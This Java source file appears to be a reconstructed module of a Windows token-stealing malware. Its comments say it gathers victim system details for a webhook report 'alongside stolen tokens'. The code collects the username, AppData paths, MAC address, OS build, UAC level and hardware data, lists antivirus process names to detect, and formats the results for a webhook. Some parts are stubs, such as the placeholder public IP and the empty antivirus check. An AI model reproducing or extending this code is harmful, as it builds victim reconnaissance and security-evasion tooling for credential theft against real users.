import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * System Information Collector
 * Obfuscated name: ѧ (U+0467)
 *
 * Collects comprehensive system information to include in the
 * webhook report alongside stolen tokens.
 *
 * Information collected:
 * - OS name and version (Windows 10/11, build number)
 * - Computer name (hostname)
 * - Username
 * - CPU model and core count
 * - RAM total and available
 * - Disk drives and sizes
 * - IP address (local and public)
 * - MAC address
 * - Screen resolution
 * - Installed software list
 * - Running processes
 * - Network interfaces
 * - Antivirus software detected
 * - Windows Defender status
 * - UAC level
 * - System uptime
 *
 * Output format:
 * JSON object with all system info fields.
 * Sent to webhook as part of the initial report.
 *
 * Three static string fields (ÿ, þ, ý) likely contain:
 * - ÿ: Public IP API URL (e.g., "https://api.ipify.org?format=json")
 * - þ: Geolocation API URL
 * - ý: User agent string
 */
public class SystemInfoCollector {

    // Public IP lookup API URL
    private static final String IP_API_URL;

    // Geolocation API URL
    private static final String GEO_API_URL;

    // User agent for HTTP requests
    private static final String USER_AGENT;

    // =========================================================
    // COLLECTION
    // =========================================================

    /**
     * Collects all system information and returns as JSON.
     *
     * @return JSONObject with all system info
     */
    public static JSONObject collectAll() {
        JSONObject info = new JSONObject();

        try {
            info.put("os", getOsInfo());
            info.put("hardware", getHardwareInfo());
            info.put("network", getNetworkInfo());
            info.put("security", getSecurityInfo());
            info.put("user", getUserInfo());
        } catch (Exception e) {
            // Partial collection on error
        }

        return info;
    }

    /**
     * Gets OS information.
     *
     * @return JSONObject with os_name, os_version, os_arch, computer_name
     */
    public static JSONObject getOsInfo() {
        JSONObject os = new JSONObject();
        os.put("name", System.getProperty("os.name", "Unknown"));
        os.put("version", System.getProperty("os.version", "Unknown"));
        os.put("arch", System.getProperty("os.arch", "Unknown"));
        os.put("computer_name", System.getenv("COMPUTERNAME"));
        os.put("username", System.getProperty("user.name", "Unknown"));

        // Get Windows build number from registry
        try {
            String buildNumber = WindowsApiWrappers.RegistryChecker.readStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                "CurrentBuildNumber"
            );
            os.put("build", buildNumber);

            String displayVersion = WindowsApiWrappers.RegistryChecker.readStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                "DisplayVersion"
            );
            os.put("display_version", displayVersion);
        } catch (Exception ignored) {}

        return os;
    }

    /**
     * Gets hardware information.
     *
     * @return JSONObject with cpu_cores, ram_total, ram_free, disk_info
     */
    public static JSONObject getHardwareInfo() {
        JSONObject hw = new JSONObject();

        // CPU
        hw.put("cpu_cores", Runtime.getRuntime().availableProcessors());

        // RAM
        try {
            com.sun.management.OperatingSystemMXBean osBean =
                (com.sun.management.OperatingSystemMXBean)
                java.lang.management.ManagementFactory.getOperatingSystemMXBean();
            long totalRam = osBean.getTotalPhysicalMemorySize();
            long freeRam = osBean.getFreePhysicalMemorySize();
            hw.put("ram_total_gb", String.format("%.1f", totalRam / 1e9));
            hw.put("ram_free_gb", String.format("%.1f", freeRam / 1e9));
        } catch (Exception ignored) {}

        // Disk drives
        JSONArray disks = new JSONArray();
        for (File root : File.listRoots()) {
            JSONObject disk = new JSONObject();
            disk.put("path", root.getAbsolutePath());
            disk.put("total_gb", String.format("%.1f", root.getTotalSpace() / 1e9));
            disk.put("free_gb", String.format("%.1f", root.getFreeSpace() / 1e9));
            disks.put(disk);
        }
        hw.put("disks", disks);

        // Screen resolution
        try {
            java.awt.Dimension screenSize = java.awt.Toolkit.getDefaultToolkit().getScreenSize();
            hw.put("screen", screenSize.width + "x" + screenSize.height);
        } catch (Exception ignored) {}

        return hw;
    }

    /**
     * Gets network information including public IP and geolocation.
     *
     * @return JSONObject with local_ip, public_ip, mac_address, country, city
     */
    public static JSONObject getNetworkInfo() {
        JSONObject net = new JSONObject();

        // Local IP
        try {
            net.put("local_ip", java.net.InetAddress.getLocalHost().getHostAddress());
        } catch (Exception ignored) {}

        // Public IP via API
        try {
            // GET request to IP_API_URL
            // Response: {"ip": "1.2.3.4"}
            net.put("public_ip", "N/A"); // placeholder
        } catch (Exception ignored) {}

        // MAC address
        try {
            java.net.NetworkInterface ni = java.net.NetworkInterface.getByInetAddress(
                java.net.InetAddress.getLocalHost()
            );
            if (ni != null) {
                byte[] mac = ni.getHardwareAddress();
                if (mac != null) {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < mac.length; i++) {
                        sb.append(String.format("%02X%s", mac[i], i < mac.length - 1 ? ":" : ""));
                    }
                    net.put("mac_address", sb.toString());
                }
            }
        } catch (Exception ignored) {}

        return net;
    }

    /**
     * Gets security software information.
     *
     * @return JSONObject with antivirus, defender_status, uac_level
     */
    public static JSONObject getSecurityInfo() {
        JSONObject sec = new JSONObject();

        // Check for common antivirus processes
        JSONArray avList = new JSONArray();
        String[] avProcesses = {
            "MsMpEng.exe",    // Windows Defender
            "avp.exe",        // Kaspersky
            "avgnt.exe",      // Avira
            "avguard.exe",    // Avira
            "bdagent.exe",    // Bitdefender
            "ekrn.exe",       // ESET
            "mbam.exe",       // Malwarebytes
            "mcshield.exe",   // McAfee
            "NortonSecurity.exe", // Norton
            "SavService.exe", // Sophos
        };

        for (String avProcess : avProcesses) {
            // Check if process is running
            // ProcessHandle.allProcesses()...
        }

        sec.put("antivirus", avList);

        // UAC level from registry
        try {
            String uacLevel = WindowsApiWrappers.RegistryChecker.readStringValue(
                com.sun.jna.platform.win32.WinReg.HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "ConsentPromptBehaviorAdmin"
            );
            sec.put("uac_level", uacLevel);
        } catch (Exception ignored) {}

        return sec;
    }

    /**
     * Gets user account information.
     *
     * @return JSONObject with username, home_dir, is_admin
     */
    public static JSONObject getUserInfo() {
        JSONObject user = new JSONObject();
        user.put("username", System.getProperty("user.name", "Unknown"));
        user.put("home_dir", System.getProperty("user.home", "Unknown"));
        user.put("appdata", System.getenv("APPDATA"));
        user.put("localappdata", System.getenv("LOCALAPPDATA"));

        // Check if running as admin
        try {
            String isAdmin = System.getenv("PROCESSOR_ARCHITECTURE");
            user.put("is_admin", false); // placeholder
        } catch (Exception ignored) {}

        return user;
    }

    /**
     * Formats system info as a readable string for webhook messages.
     */
    public static String formatForWebhook() {
        JSONObject info = collectAll();
        StringBuilder sb = new StringBuilder();

        sb.append("**💻 System Information**\n");

        try {
            JSONObject os = info.getJSONObject("os");
            sb.append("**OS:** ").append(os.optString("name")).append(" ")
              .append(os.optString("display_version")).append("\n");
            sb.append("**Computer:** ").append(os.optString("computer_name")).append("\n");
            sb.append("**User:** ").append(os.optString("username")).append("\n");
        } catch (Exception ignored) {}

        try {
            JSONObject hw = info.getJSONObject("hardware");
            sb.append("**CPU Cores:** ").append(hw.optInt("cpu_cores")).append("\n");
            sb.append("**RAM:** ").append(hw.optString("ram_total_gb")).append(" GB\n");
            sb.append("**Screen:** ").append(hw.optString("screen")).append("\n");
        } catch (Exception ignored) {}

        try {
            JSONObject net = info.getJSONObject("network");
            sb.append("**IP:** ").append(net.optString("public_ip")).append("\n");
            sb.append("**MAC:** ").append(net.optString("mac_address")).append("\n");
        } catch (Exception ignored) {}

        return sb.toString();
    }

    static {
        IP_API_URL = "https://api.ipify.org?format=json";
        GEO_API_URL = "https://ipapi.co/json/";
        USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    }
}
